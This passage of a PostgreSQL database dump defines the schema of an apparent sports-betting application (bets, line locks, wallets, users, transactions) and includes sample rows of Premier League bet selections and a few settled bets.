--
-- PostgreSQL database dump
--

\restrict QKkrMnIlzUN3iQFCS7SVPqNpdXnx1pKM9uLty0qz3a3tm3jQscjqjHgVAtsSh4G

-- Dumped from database version 16.10 (Homebrew)
-- Dumped by pg_dump version 16.10 (Homebrew)

SET statement_timeout = 0;
SET lock_timeout = 0;
SET idle_in_transaction_session_timeout = 0;
SET client_encoding = 'UTF8';
SET standard_conforming_strings = on;
SELECT pg_catalog.set_config('search_path', '', false);
SET check_function_bodies = false;
SET xmloption = content;
SET client_min_messages = warning;
SET row_security = off;

--
-- Name: uuid-ossp; Type: EXTENSION; Schema: -; Owner: -
--

CREATE EXTENSION IF NOT EXISTS "uuid-ossp" WITH SCHEMA public;


--
-- Name: EXTENSION "uuid-ossp"; Type: COMMENT; Schema: -; Owner: 
--

COMMENT ON EXTENSION "uuid-ossp" IS 'generate universally unique identifiers (UUIDs)';


SET default_tablespace = '';

SET default_table_access_method = heap;

--
-- Name: BetSelections; Type: TABLE; Schema: public; Owner: calebwilliams
--

CREATE TABLE public."BetSelections" (
    "Id" uuid NOT NULL,
    "BetId" uuid NOT NULL,
    "EventId" uuid NOT NULL,
    "EventName" character varying(200) NOT NULL,
    "MarketId" uuid NOT NULL,
    "MarketType" text NOT NULL,
    "MarketName" character varying(100) NOT NULL,
    "OutcomeId" uuid NOT NULL,
    "OutcomeName" character varying(100) NOT NULL,
    "Line" numeric(10,2),
    "Result" text NOT NULL,
    "BetId1" uuid,
    "LockedOddsDecimal" numeric(10,4) NOT NULL
);


ALTER TABLE public."BetSelections" OWNER TO calebwilliams;

--
-- Name: Bets; Type: TABLE; Schema: public; Owner: calebwilliams
--

CREATE TABLE public."Bets" (
    "Id" uuid NOT NULL,
    "UserId" uuid NOT NULL,
    "TicketNumber" character varying(50) NOT NULL,
    "Type" text NOT NULL,
    "Status" text NOT NULL,
    "PlacedAt" timestamp with time zone NOT NULL,
    "SettledAt" timestamp with time zone,
    "ActualPayout" numeric(18,2),
    "LineLockId" uuid,
    "ActualPayoutCurrency" character(3),
    "CombinedOddsDecimal" numeric(10,4) NOT NULL,
    "PotentialPayout" numeric(18,2) NOT NULL,
    "PotentialPayoutCurrency" character(3) NOT NULL,
    "Stake" numeric(18,2) NOT NULL,
    "StakeCurrency" character(3) NOT NULL,
    CONSTRAINT "CK_Bets_ActualPayout_NonNegative" CHECK ((("ActualPayout" IS NULL) OR ("ActualPayout" >= (0)::numeric))),
    CONSTRAINT "CK_Bets_CombinedOdds_MinimumOne" CHECK (("CombinedOddsDecimal" >= 1.0)),
    CONSTRAINT "CK_Bets_PotentialPayout_NonNegative" CHECK (("PotentialPayout" >= (0)::numeric)),
    CONSTRAINT "CK_Bets_Stake_Positive" CHECK (("Stake" > (0)::numeric))
);


ALTER TABLE public."Bets" OWNER TO calebwilliams;

--
-- Name: Events; Type: TABLE; Schema: public; Owner: calebwilliams
--

CREATE TABLE public."Events" (
    "Id" uuid NOT NULL,
    "LeagueId" uuid NOT NULL,
    "Name" character varying(200) NOT NULL,
    "HomeTeamId" uuid NOT NULL,
    "AwayTeamId" uuid NOT NULL,
    "ScheduledStartTime" timestamp with time zone NOT NULL,
    "Venue" character varying(200),
    "Status" text NOT NULL,
    "FinalScore" character varying(20)
);


ALTER TABLE public."Events" OWNER TO calebwilliams;

--
-- Name: Leagues; Type: TABLE; Schema: public; Owner: calebwilliams
--

CREATE TABLE public."Leagues" (
    "Id" uuid NOT NULL,
    "Name" character varying(100) NOT NULL,
    "Code" character varying(20) NOT NULL,
    "SportId" uuid NOT NULL,
    "SportId1" uuid
);


ALTER TABLE public."Leagues" OWNER TO calebwilliams;

--
-- Name: LineLocks; Type: TABLE; Schema: public; Owner: calebwilliams
--

CREATE TABLE public."LineLocks" (
    "Id" uuid NOT NULL,
    "UserId" uuid NOT NULL,
    "LockNumber" character varying(50) NOT NULL,
    "EventId" uuid NOT NULL,
    "EventName" character varying(200) NOT NULL,
    "MarketId" uuid NOT NULL,
    "MarketType" text NOT NULL,
    "MarketName" character varying(100) NOT NULL,
    "OutcomeId" uuid NOT NULL,
    "OutcomeName" character varying(100) NOT NULL,
    "Line" numeric(10,2),
    "ExpirationTime" timestamp with time zone NOT NULL,
    "CreatedAt" timestamp with time zone NOT NULL,
    "Status" text NOT NULL,
    "AssociatedBetId" uuid,
    "SettledAt" timestamp with time zone,
    "LockFee" numeric(18,2) NOT NULL,
    "LockFeeCurrency" character(3) NOT NULL,
    "LockedOddsDecimal" numeric(10,4) NOT NULL,
    "MaxStake" numeric(18,2) NOT NULL,
    "MaxStakeCurrency" character(3) NOT NULL
);


ALTER TABLE public."LineLocks" OWNER TO calebwilliams;

--
-- Name: Markets; Type: TABLE; Schema: public; Owner: calebwilliams
--

CREATE TABLE public."Markets" (
    "Id" uuid NOT NULL,
    "EventId" uuid NOT NULL,
    "Type" text NOT NULL,
    "Name" character varying(100) NOT NULL,
    "Description" character varying(500),
    "IsOpen" boolean NOT NULL,
    "IsSettled" boolean NOT NULL,
    "EventId1" uuid
);


ALTER TABLE public."Markets" OWNER TO calebwilliams;

--
-- Name: Outcomes; Type: TABLE; Schema: public; Owner: calebwilliams
--

CREATE TABLE public."Outcomes" (
    "Id" uuid NOT NULL,
    "MarketId" uuid NOT NULL,
    "Name" character varying(100) NOT NULL,
    "Description" character varying(500) NOT NULL,
    "Line" numeric(10,2),
    "IsWinner" boolean,
    "IsVoid" boolean NOT NULL,
    "MarketId1" uuid,
    "CurrentOddsDecimal" numeric(10,4) NOT NULL
);


ALTER TABLE public."Outcomes" OWNER TO calebwilliams;

--
-- Name: RefreshTokens; Type: TABLE; Schema: public; Owner: calebwilliams
--

CREATE TABLE public."RefreshTokens" (
    "Id" uuid NOT NULL,
    "UserId" uuid NOT NULL,
    "Token" character varying(500) NOT NULL,
    "ExpiresAt" timestamp with time zone NOT NULL,
    "CreatedAt" timestamp with time zone NOT NULL,
    "IsRevoked" boolean NOT NULL,
    "RevokedAt" timestamp with time zone
);


ALTER TABLE public."RefreshTokens" OWNER TO calebwilliams;

--
-- Name: Sports; Type: TABLE; Schema: public; Owner: calebwilliams
--

CREATE TABLE public."Sports" (
    "Id" uuid NOT NULL,
    "Name" character varying(100) NOT NULL,
    "Code" character varying(20) NOT NULL
);


ALTER TABLE public."Sports" OWNER TO calebwilliams;

--
-- Name: Teams; Type: TABLE; Schema: public; Owner: calebwilliams
--

CREATE TABLE public."Teams" (
    "Id" uuid NOT NULL,
    "Name" character varying(100) NOT NULL,
    "Code" character varying(20) NOT NULL,
    "City" character varying(100),
    "LeagueId" uuid NOT NULL,
    "LeagueId1" uuid
);


ALTER TABLE public."Teams" OWNER TO calebwilliams;

--
-- Name: Transactions; Type: TABLE; Schema: public; Owner: calebwilliams
--

CREATE TABLE public."Transactions" (
    "Id" uuid NOT NULL,
    "UserId" uuid NOT NULL,
    "Type" text NOT NULL,
    "ReferenceId" uuid,
    "Description" character varying(500) NOT NULL,
    "Status" text NOT NULL,
    "CreatedAt" timestamp with time zone NOT NULL,
    "CompletedAt" timestamp with time zone,
    "Amount" numeric(18,2) NOT NULL,
    "Currency" character(3) NOT NULL,
    "BalanceAfter" numeric(18,2) NOT NULL,
    "BalanceAfterCurrency" character(3) NOT NULL,
    "BalanceBefore" numeric(18,2) NOT NULL,
    "BalanceBeforeCurrency" character(3) NOT NULL,
    CONSTRAINT "CK_Transactions_Amount_Positive" CHECK (("Amount" > (0)::numeric)),
    CONSTRAINT "CK_Transactions_BalanceAfter_NonNegative" CHECK (("BalanceAfter" >= (0)::numeric)),
    CONSTRAINT "CK_Transactions_BalanceBefore_NonNegative" CHECK (("BalanceBefore" >= (0)::numeric))
);


ALTER TABLE public."Transactions" OWNER TO calebwilliams;

--
-- Name: Users; Type: TABLE; Schema: public; Owner: calebwilliams
--

CREATE TABLE public."Users" (
    "Id" uuid NOT NULL,
    "Username" character varying(50) NOT NULL,
    "Email" character varying(255) NOT NULL,
    "PasswordHash" character varying(255) NOT NULL,
    "Currency" character(3) NOT NULL,
    "CreatedAt" timestamp with time zone NOT NULL,
    "LastLoginAt" timestamp with time zone,
    "Status" text NOT NULL,
    "EmailVerificationToken" text,
    "EmailVerificationTokenExpires" timestamp with time zone,
    "EmailVerified" boolean DEFAULT false NOT NULL,
    "PasswordResetToken" text,
    "PasswordResetTokenExpires" timestamp with time zone,
    "Role" integer DEFAULT 0 NOT NULL
);


ALTER TABLE public."Users" OWNER TO calebwilliams;

--
-- Name: Wallets; Type: TABLE; Schema: public; Owner: calebwilliams
--

CREATE TABLE public."Wallets" (
    "Id" uuid NOT NULL,
    "UserId" uuid NOT NULL,
    "CreatedAt" timestamp with time zone NOT NULL,
    "LastUpdatedAt" timestamp with time zone NOT NULL,
    "Balance" numeric(18,2) NOT NULL,
    "Currency" character(3) NOT NULL,
    "TotalBet" numeric(18,2) NOT NULL,
    "TotalBetCurrency" character(3) NOT NULL,
    "TotalDeposited" numeric(18,2) NOT NULL,
    "TotalDepositedCurrency" character(3) NOT NULL,
    "TotalWithdrawn" numeric(18,2) NOT NULL,
    "TotalWithdrawnCurrency" character(3) NOT NULL,
    "TotalWon" numeric(18,2) NOT NULL,
    "TotalWonCurrency" character(3) NOT NULL,
    CONSTRAINT "CK_Wallets_Balance_NonNegative" CHECK (("Balance" >= (0)::numeric)),
    CONSTRAINT "CK_Wallets_TotalBet_NonNegative" CHECK (("TotalBet" >= (0)::numeric)),
    CONSTRAINT "CK_Wallets_TotalDeposited_NonNegative" CHECK (("TotalDeposited" >= (0)::numeric)),
    CONSTRAINT "CK_Wallets_TotalWithdrawn_NonNegative" CHECK (("TotalWithdrawn" >= (0)::numeric)),
    CONSTRAINT "CK_Wallets_TotalWon_NonNegative" CHECK (("TotalWon" >= (0)::numeric))
);


ALTER TABLE public."Wallets" OWNER TO calebwilliams;

--
-- Name: __EFMigrationsHistory; Type: TABLE; Schema: public; Owner: calebwilliams
--

CREATE TABLE public."__EFMigrationsHistory" (
    "MigrationId" character varying(150) NOT NULL,
    "ProductVersion" character varying(32) NOT NULL
);


ALTER TABLE public."__EFMigrationsHistory" OWNER TO calebwilliams;

--
-- Data for Name: BetSelections; Type: TABLE DATA; Schema: public; Owner: calebwilliams
--

COPY public."BetSelections" ("Id", "BetId", "EventId", "EventName", "MarketId", "MarketType", "MarketName", "OutcomeId", "OutcomeName", "Line", "Result", "BetId1", "LockedOddsDecimal") FROM stdin;
16c2dfb8-3b7c-4929-887e-05c277c558c9	57be29ea-2a8a-4854-980c-54820bdcf8a9	5854aeb8-17c2-44dc-85b4-6c7afe4f573d	Arsenal vs Chelsea	4464a42b-c3ef-4b84-b9d8-9404fe1e0393	Moneyline	Match Winner	3f35cca8-57c9-4816-94d3-49bdf80a6121	Arsenal Win	\N	Won	57be29ea-2a8a-4854-980c-54820bdcf8a9	2.1000
ecde5bf9-f644-47af-a201-abb18afea839	a66182ac-f9ef-4a73-97a7-9b87c962ceed	5854aeb8-17c2-44dc-85b4-6c7afe4f573d	Arsenal vs Chelsea	4464a42b-c3ef-4b84-b9d8-9404fe1e0393	Moneyline	Match Winner	3f35cca8-57c9-4816-94d3-49bdf80a6121	Arsenal Win	\N	Won	a66182ac-f9ef-4a73-97a7-9b87c962ceed	2.1000
15ed8366-e254-45f3-a46f-edd101a30041	d65ecb01-b85f-47ed-811d-18df1d8dc2a8	a5a7f758-07d0-4e82-ba80-4a29b72213ec	Manchester United vs Liverpool	776bdb4a-4c1b-46a1-bdb5-70bfafe2820b	Moneyline	Match Winner	c5ff1112-94b3-43a1-b209-8a1563025734	Manchester United Win	\N	Won	d65ecb01-b85f-47ed-811d-18df1d8dc2a8	2.2000
2978b1c6-0ef9-4198-9464-334e7eb27aee	d65ecb01-b85f-47ed-811d-18df1d8dc2a8	9e572c95-5a6f-4010-b7e3-d804ccc3f4b2	Tottenham vs Manchester City	9670128a-a449-4ef0-8d2b-c73331be612a	Moneyline	Match Winner	c1b311fc-ac37-42a1-8c34-bcabbbcf8078	Manchester City Win	\N	Won	d65ecb01-b85f-47ed-811d-18df1d8dc2a8	1.7500
a2a5b235-ad13-40fc-92db-4a3cdda2c8a0	d65ecb01-b85f-47ed-811d-18df1d8dc2a8	02dfc377-26d3-4751-9363-43b38eb28663	Arsenal vs Tottenham	29f5d2b8-0ba8-40dc-ad13-431ec9a5380a	Moneyline	Match Winner	d98b2270-860d-4cd0-8e20-4269d2ae8b8b	Arsenal Win	\N	Won	d65ecb01-b85f-47ed-811d-18df1d8dc2a8	1.8500
000a7ae3-6dff-4901-b686-b14618f22cbb	40547320-7419-4307-bfe6-926a4afb172b	abcdfcc3-f7f6-43d6-96ab-9f7b87220d98	Manchester United vs Manchester City	ae017678-2dcc-4a8b-a225-42dd70f5bb79	Moneyline	Match Winner	fd9c368c-f590-49d7-a547-120cfc445371	Manchester City Win	\N	Won	40547320-7419-4307-bfe6-926a4afb172b	2.1000
51c8df2e-df84-4d6a-933b-d278596ccc18	40547320-7419-4307-bfe6-926a4afb172b	6f7a8600-91d9-4957-afbf-ff87386813a5	Chelsea vs Liverpool	0b684835-6557-417e-a446-2b6ca7469b92	Moneyline	Match Winner	808b32c3-e30f-48c9-a183-9dcae2993fcc	Chelsea Win	\N	Lost	40547320-7419-4307-bfe6-926a4afb172b	2.5000
62d6b09a-9fc4-4c15-b64b-90d1d62c9e13	4dc3e93e-b116-4033-93f1-7ed91cd405ef	6f7a8600-91d9-4957-afbf-ff87386813a5	Chelsea vs Liverpool	0b684835-6557-417e-a446-2b6ca7469b92	Moneyline	Match Winner	d46a0b7f-fb0e-4840-819c-531165148906	Draw	\N	Pending	4dc3e93e-b116-4033-93f1-7ed91cd405ef	3.2000
465997d8-31fa-4e5f-9558-78ca1d97a7d4	19ab099d-ec3a-47d9-9168-7e2f9ffa4031	abcdfcc3-f7f6-43d6-96ab-9f7b87220d98	Manchester United vs Manchester City	ae017678-2dcc-4a8b-a225-42dd70f5bb79	Moneyline	Match Winner	cd2ac0c5-9245-471b-9b3e-c82da2e5ae11	Draw	\N	Pending	19ab099d-ec3a-47d9-9168-7e2f9ffa4031	3.3000
5945f670-8b5e-4a07-b5f3-8e19a1639340	ef624305-8e39-4800-a013-bb3fb51d7a1a	5854aeb8-17c2-44dc-85b4-6c7afe4f573d	Arsenal vs Chelsea	4464a42b-c3ef-4b84-b9d8-9404fe1e0393	Moneyline	Match Winner	a23843a3-57c7-421f-a8e8-af24a5108a1d	Draw	\N	Pending	ef624305-8e39-4800-a013-bb3fb51d7a1a	3.4000
ab2bee3b-e489-46b5-97f0-f68f83faa1c0	c0072d32-8763-465d-b6d7-060bc85a5fb2	02dfc377-26d3-4751-9363-43b38eb28663	Arsenal vs Tottenham	29f5d2b8-0ba8-40dc-ad13-431ec9a5380a	Moneyline	Match Winner	d98b2270-860d-4cd0-8e20-4269d2ae8b8b	Arsenal Win	\N	Pending	c0072d32-8763-465d-b6d7-060bc85a5fb2	1.8500
7873507f-6ac6-442b-bced-c7f021aca519	235cfdb6-846c-4f4c-afab-3b960890cd0d	a5a7f758-07d0-4e82-ba80-4a29b72213ec	Manchester United vs Liverpool	776bdb4a-4c1b-46a1-bdb5-70bfafe2820b	Moneyline	Match Winner	c5ff1112-94b3-43a1-b209-8a1563025734	Manchester United Win	\N	Pending	235cfdb6-846c-4f4c-afab-3b960890cd0d	2.2000
18c46794-db86-460a-afde-1f7eff73aaf3	366faaac-d6b1-42ae-a024-05781c406273	02dfc377-26d3-4751-9363-43b38eb28663	Arsenal vs Tottenham	29f5d2b8-0ba8-40dc-ad13-431ec9a5380a	Moneyline	Match Winner	d98b2270-860d-4cd0-8e20-4269d2ae8b8b	Arsenal Win	\N	Pending	366faaac-d6b1-42ae-a024-05781c406273	1.8500
14a57109-fa33-49fe-a83a-d0d878e18f35	b0c209de-d875-4eca-97dd-d42007953b04	6f7a8600-91d9-4957-afbf-ff87386813a5	Chelsea vs Liverpool	0b684835-6557-417e-a446-2b6ca7469b92	Moneyline	Match Winner	d46a0b7f-fb0e-4840-819c-531165148906	Draw	\N	Pending	b0c209de-d875-4eca-97dd-d42007953b04	3.2000
d5bc61b1-34e5-4792-a30d-5c350d50fe7d	08e8e76b-d5d8-4c80-bb23-b7ece33292dd	abcdfcc3-f7f6-43d6-96ab-9f7b87220d98	Manchester United vs Manchester City	ae017678-2dcc-4a8b-a225-42dd70f5bb79	Moneyline	Match Winner	fd9c368c-f590-49d7-a547-120cfc445371	Manchester City Win	\N	Pending	08e8e76b-d5d8-4c80-bb23-b7ece33292dd	2.1000
399f6160-ce09-4214-86b2-e6b564266f4e	14d12b67-c8e4-40b8-abb6-611ee015e1a4	a5a7f758-07d0-4e82-ba80-4a29b72213ec	Manchester United vs Liverpool	776bdb4a-4c1b-46a1-bdb5-70bfafe2820b	Moneyline	Match Winner	3a7db331-aa81-471e-8d40-2d62c9b97a97	Draw	\N	Pending	14d12b67-c8e4-40b8-abb6-611ee015e1a4	3.4000
b122deb9-88e0-44b4-a82a-00e0753229c0	00365444-2801-4692-8f00-f9bbee10b2df	6f7a8600-91d9-4957-afbf-ff87386813a5	Chelsea vs Liverpool	0b684835-6557-417e-a446-2b6ca7469b92	Moneyline	Match Winner	4b65c61a-36fb-4fd0-a416-7d259f918ab2	Liverpool Win	\N	Pending	00365444-2801-4692-8f00-f9bbee10b2df	2.3000
de8cc1c7-b783-48f0-8153-6dc7210109bf	4a2cac53-5e0e-4015-afad-5bb35d94cf36	abcdfcc3-f7f6-43d6-96ab-9f7b87220d98	Manchester United vs Manchester City	ae017678-2dcc-4a8b-a225-42dd70f5bb79	Moneyline	Match Winner	cf9f1713-0351-455c-b828-13592f74630b	Manchester United Win	\N	Pending	4a2cac53-5e0e-4015-afad-5bb35d94cf36	2.6000
0744e859-a42a-4782-bd23-71b301a60c22	8ae04dc4-bc7e-42ae-afbd-7320ebe4189c	02dfc377-26d3-4751-9363-43b38eb28663	Arsenal vs Tottenham	29f5d2b8-0ba8-40dc-ad13-431ec9a5380a	Moneyline	Match Winner	d98b2270-860d-4cd0-8e20-4269d2ae8b8b	Arsenal Win	\N	Pending	8ae04dc4-bc7e-42ae-afbd-7320ebe4189c	1.8500
8a072527-3abe-4684-8506-ab7195b95b89	689931c8-d466-4aae-924d-57c49407e37d	5854aeb8-17c2-44dc-85b4-6c7afe4f573d	Arsenal vs Chelsea	4464a42b-c3ef-4b84-b9d8-9404fe1e0393	Moneyline	Match Winner	3f35cca8-57c9-4816-94d3-49bdf80a6121	Arsenal Win	\N	Pending	689931c8-d466-4aae-924d-57c49407e37d	999.9900
cdb01313-23a9-4062-8352-3bb35c9cc1bf	b4af0b77-3694-4e5b-9563-03f85adeada8	02dfc377-26d3-4751-9363-43b38eb28663	Arsenal vs Tottenham	29f5d2b8-0ba8-40dc-ad13-431ec9a5380a	Moneyline	Match Winner	12217ff4-c67a-48b7-a674-6b9c7107a023	Tottenham Win	\N	Pending	b4af0b77-3694-4e5b-9563-03f85adeada8	4.0000
1fb16439-9e10-47fe-9a50-63f4889d2bd1	6e80a592-5cf8-47ae-bc82-678285521eac	5854aeb8-17c2-44dc-85b4-6c7afe4f573d	Arsenal vs Chelsea	4464a42b-c3ef-4b84-b9d8-9404fe1e0393	Moneyline	Match Winner	3f35cca8-57c9-4816-94d3-49bdf80a6121	Arsenal Win	\N	Pending	6e80a592-5cf8-47ae-bc82-678285521eac	999.9900
10ab37d1-235f-448f-8065-edca6def07c1	09a2ab08-6fc0-4861-a3cc-7df113fe0c24	6f7a8600-91d9-4957-afbf-ff87386813a5	Chelsea vs Liverpool	0b684835-6557-417e-a446-2b6ca7469b92	Moneyline	Match Winner	d46a0b7f-fb0e-4840-819c-531165148906	Draw	\N	Pending	09a2ab08-6fc0-4861-a3cc-7df113fe0c24	3.2000
4057e363-5288-4689-b5aa-70ae378460d6	c8cb7946-07cb-4818-a1d2-3cd609682900	a5a7f758-07d0-4e82-ba80-4a29b72213ec	Manchester United vs Liverpool	776bdb4a-4c1b-46a1-bdb5-70bfafe2820b	Moneyline	Match Winner	c5ff1112-94b3-43a1-b209-8a1563025734	Manchester United Win	\N	Pending	c8cb7946-07cb-4818-a1d2-3cd609682900	2.2000
c22545f0-a338-4cb6-a215-1948437d1c9d	0072e65b-8110-4988-af24-901a25e84380	02dfc377-26d3-4751-9363-43b38eb28663	Arsenal vs Tottenham	29f5d2b8-0ba8-40dc-ad13-431ec9a5380a	Moneyline	Match Winner	d98b2270-860d-4cd0-8e20-4269d2ae8b8b	Arsenal Win	\N	Pending	0072e65b-8110-4988-af24-901a25e84380	1.8500
09a2da0f-1250-4959-9583-69a46568cf18	4cafb04b-5c80-4c6d-9510-3972e327de6d	abcdfcc3-f7f6-43d6-96ab-9f7b87220d98	Manchester United vs Manchester City	ae017678-2dcc-4a8b-a225-42dd70f5bb79	Moneyline	Match Winner	cd2ac0c5-9245-471b-9b3e-c82da2e5ae11	Draw	\N	Pending	4cafb04b-5c80-4c6d-9510-3972e327de6d	3.3000
083de99c-409c-40d6-8dd5-fc1adfbd3221	6b82aaaa-b584-4b22-af42-f7d95d9e6cc1	abcdfcc3-f7f6-43d6-96ab-9f7b87220d98	Manchester United vs Manchester City	ae017678-2dcc-4a8b-a225-42dd70f5bb79	Moneyline	Match Winner	cd2ac0c5-9245-471b-9b3e-c82da2e5ae11	Draw	\N	Pending	6b82aaaa-b584-4b22-af42-f7d95d9e6cc1	3.3000
5f44acd0-17e9-440a-8f24-67400a4903dc	1e7ba305-8280-4e5f-897d-e334cbb7a1fa	abcdfcc3-f7f6-43d6-96ab-9f7b87220d98	Manchester United vs Manchester City	ae017678-2dcc-4a8b-a225-42dd70f5bb79	Moneyline	Match Winner	cd2ac0c5-9245-471b-9b3e-c82da2e5ae11	Draw	\N	Pending	1e7ba305-8280-4e5f-897d-e334cbb7a1fa	3.3000
b544926f-9dd8-4c1a-a0fa-9637d7ae0068	116af921-0c7b-467b-b685-38a1c9ea7b4e	9e572c95-5a6f-4010-b7e3-d804ccc3f4b2	Tottenham vs Manchester City	9670128a-a449-4ef0-8d2b-c73331be612a	Moneyline	Match Winner	c1b311fc-ac37-42a1-8c34-bcabbbcf8078	Manchester City Win	\N	Pending	116af921-0c7b-467b-b685-38a1c9ea7b4e	1.7500
6b25adbf-b464-4719-af43-cf312e6baa13	20826f4f-883c-4d30-b351-fd4d94b23f25	abcdfcc3-f7f6-43d6-96ab-9f7b87220d98	Manchester United vs Manchester City	ae017678-2dcc-4a8b-a225-42dd70f5bb79	Moneyline	Match Winner	fd9c368c-f590-49d7-a547-120cfc445371	Manchester City Win	\N	Pending	20826f4f-883c-4d30-b351-fd4d94b23f25	2.1000
f433e862-c89f-4146-ac4c-193227e86379	068e8f92-7958-4f82-a955-ac773c965cf3	abcdfcc3-f7f6-43d6-96ab-9f7b87220d98	Manchester United vs Manchester City	ae017678-2dcc-4a8b-a225-42dd70f5bb79	Moneyline	Match Winner	cf9f1713-0351-455c-b828-13592f74630b	Manchester United Win	\N	Pending	068e8f92-7958-4f82-a955-ac773c965cf3	2.6000
32e2c7d6-4897-4ce0-97e1-c11b30f7b1bc	53020a2f-c679-4e06-8759-ddba7f475798	6f7a8600-91d9-4957-afbf-ff87386813a5	Chelsea vs Liverpool	0b684835-6557-417e-a446-2b6ca7469b92	Moneyline	Match Winner	4b65c61a-36fb-4fd0-a416-7d259f918ab2	Liverpool Win	\N	Pending	53020a2f-c679-4e06-8759-ddba7f475798	2.3000
8050e228-a5e8-4911-8873-0f7e6f847877	1f8e530d-db4c-4c66-8868-8f7a43398b54	9e572c95-5a6f-4010-b7e3-d804ccc3f4b2	Tottenham vs Manchester City	9670128a-a449-4ef0-8d2b-c73331be612a	Moneyline	Match Winner	b1ca5c77-c3c3-4ad7-add3-945b5f691c9a	Tottenham Win	\N	Pending	1f8e530d-db4c-4c66-8868-8f7a43398b54	3.5000
d1ffe54f-6f76-4b08-83dc-f3bda13499d7	dbe085fc-9c06-496c-8a52-7f506b72d98b	abcdfcc3-f7f6-43d6-96ab-9f7b87220d98	Manchester United vs Manchester City	ae017678-2dcc-4a8b-a225-42dd70f5bb79	Moneyline	Match Winner	cd2ac0c5-9245-471b-9b3e-c82da2e5ae11	Draw	\N	Pending	dbe085fc-9c06-496c-8a52-7f506b72d98b	3.3000
808e80ee-8940-4011-bf8c-1cdc39de2b06	d2817a4c-e976-47ab-8842-fbe41afae344	6f7a8600-91d9-4957-afbf-ff87386813a5	Chelsea vs Liverpool	0b684835-6557-417e-a446-2b6ca7469b92	Moneyline	Match Winner	808b32c3-e30f-48c9-a183-9dcae2993fcc	Chelsea Win	\N	Pending	d2817a4c-e976-47ab-8842-fbe41afae344	2.5000
502b0d47-b3ae-4c97-9df6-6b64ed0ae7f4	2b519d55-f3ec-4155-bf68-1628295a2c4e	6f7a8600-91d9-4957-afbf-ff87386813a5	Chelsea vs Liverpool	0b684835-6557-417e-a446-2b6ca7469b92	Moneyline	Match Winner	d46a0b7f-fb0e-4840-819c-531165148906	Draw	\N	Pending	2b519d55-f3ec-4155-bf68-1628295a2c4e	3.2000
cf5917b6-b00f-4a4b-906e-448326e6e933	90939f65-9adf-4f94-998d-4c88fb2a9d7b	02dfc377-26d3-4751-9363-43b38eb28663	Arsenal vs Tottenham	29f5d2b8-0ba8-40dc-ad13-431ec9a5380a	Moneyline	Match Winner	12217ff4-c67a-48b7-a674-6b9c7107a023	Tottenham Win	\N	Pending	90939f65-9adf-4f94-998d-4c88fb2a9d7b	4.0000
99a7dc48-4c01-4639-b552-0e14e2c24abd	809bb874-f60a-4ca9-98c7-a56dfbb633e9	a5a7f758-07d0-4e82-ba80-4a29b72213ec	Manchester United vs Liverpool	776bdb4a-4c1b-46a1-bdb5-70bfafe2820b	Moneyline	Match Winner	c5ff1112-94b3-43a1-b209-8a1563025734	Manchester United Win	\N	Pending	809bb874-f60a-4ca9-98c7-a56dfbb633e9	2.2000
20a74e37-c4db-43ca-90f0-463c7ad6f645	ba1276c5-28e7-40a6-8f1c-26e13edb59b9	abcdfcc3-f7f6-43d6-96ab-9f7b87220d98	Manchester United vs Manchester City	ae017678-2dcc-4a8b-a225-42dd70f5bb79	Moneyline	Match Winner	cd2ac0c5-9245-471b-9b3e-c82da2e5ae11	Draw	\N	Pending	ba1276c5-28e7-40a6-8f1c-26e13edb59b9	3.3000
c8cafff4-92b9-4941-8945-c1ec24ed982b	fcd166ea-255e-4ea6-bb41-95a00ef314a8	5854aeb8-17c2-44dc-85b4-6c7afe4f573d	Arsenal vs Chelsea	4464a42b-c3ef-4b84-b9d8-9404fe1e0393	Moneyline	Match Winner	a23843a3-57c7-421f-a8e8-af24a5108a1d	Draw	\N	Pending	fcd166ea-255e-4ea6-bb41-95a00ef314a8	3.4000
56fe6b5a-6c18-4e73-9371-3aa2bc30eb57	4244edc5-6713-4754-9832-2ac011011754	abcdfcc3-f7f6-43d6-96ab-9f7b87220d98	Manchester United vs Manchester City	ae017678-2dcc-4a8b-a225-42dd70f5bb79	Moneyline	Match Winner	cf9f1713-0351-455c-b828-13592f74630b	Manchester United Win	\N	Pending	4244edc5-6713-4754-9832-2ac011011754	2.6000
74b3aaa2-f350-49e7-9928-191440b46aff	94ecf60c-9447-49b6-99f5-ff6dac24af74	a5a7f758-07d0-4e82-ba80-4a29b72213ec	Manchester United vs Liverpool	776bdb4a-4c1b-46a1-bdb5-70bfafe2820b	Moneyline	Match Winner	3a7db331-aa81-471e-8d40-2d62c9b97a97	Draw	\N	Pending	94ecf60c-9447-49b6-99f5-ff6dac24af74	3.4000
0f1c26b3-3d34-451a-bd77-e1055fee56f9	cc3a0982-69e4-487f-bf1a-8ae290052071	abcdfcc3-f7f6-43d6-96ab-9f7b87220d98	Manchester United vs Manchester City	ae017678-2dcc-4a8b-a225-42dd70f5bb79	Moneyline	Match Winner	cf9f1713-0351-455c-b828-13592f74630b	Manchester United Win	\N	Pending	cc3a0982-69e4-487f-bf1a-8ae290052071	2.6000
f0fdd4f5-dd78-4882-9873-7baa1ea21583	5c9771dc-3940-4240-99c2-6fe3cfe8f6ae	5854aeb8-17c2-44dc-85b4-6c7afe4f573d	Arsenal vs Chelsea	4464a42b-c3ef-4b84-b9d8-9404fe1e0393	Moneyline	Match Winner	4061ad93-119f-42e7-a916-68a0201e9df5	Chelsea Win	\N	Pending	5c9771dc-3940-4240-99c2-6fe3cfe8f6ae	4.0000
\.


--
-- Data for Name: Bets; Type: TABLE DATA; Schema: public; Owner: calebwilliams
--

COPY public."Bets" ("Id", "UserId", "TicketNumber", "Type", "Status", "PlacedAt", "SettledAt", "ActualPayout", "LineLockId", "ActualPayoutCurrency", "CombinedOddsDecimal", "PotentialPayout", "PotentialPayoutCurrency", "Stake", "StakeCurrency") FROM stdin;
57be29ea-2a8a-4854-980c-54820bdcf8a9	2a414a5c-f857-44fd-ae76-e3260c9382be	BET202511142216198602	Single	Won	2025-11-14 16:16:19.144621-06	2025-11-14 17:01:01.365904-06	105.00	\N	\N	2.1000	105.00	USD	50.00	USD
a66182ac-f9ef-4a73-97a7-9b87c962ceed	2a414a5c-f857-44fd-ae76-e3260c9382be	BET202511142148114437	Single	Won	2025-11-14 15:48:11.911553-06	2025-11-14 17:01:01.463771-06	210.00	\N	\N	2.1000	210.00	USD	100.00	USD
d65ecb01-b85f-47ed-811d-18df1d8dc2a8	2a414a5c-f857-44fd-ae76-e3260c9382be	BET202511142308028897	Parlay	Won	2025-11-14 17:08:02.319594-06	2025-11-14 17:09:12.362778-06	712.25	\N	\N	7.1225	712.25	USD	100.00	USD
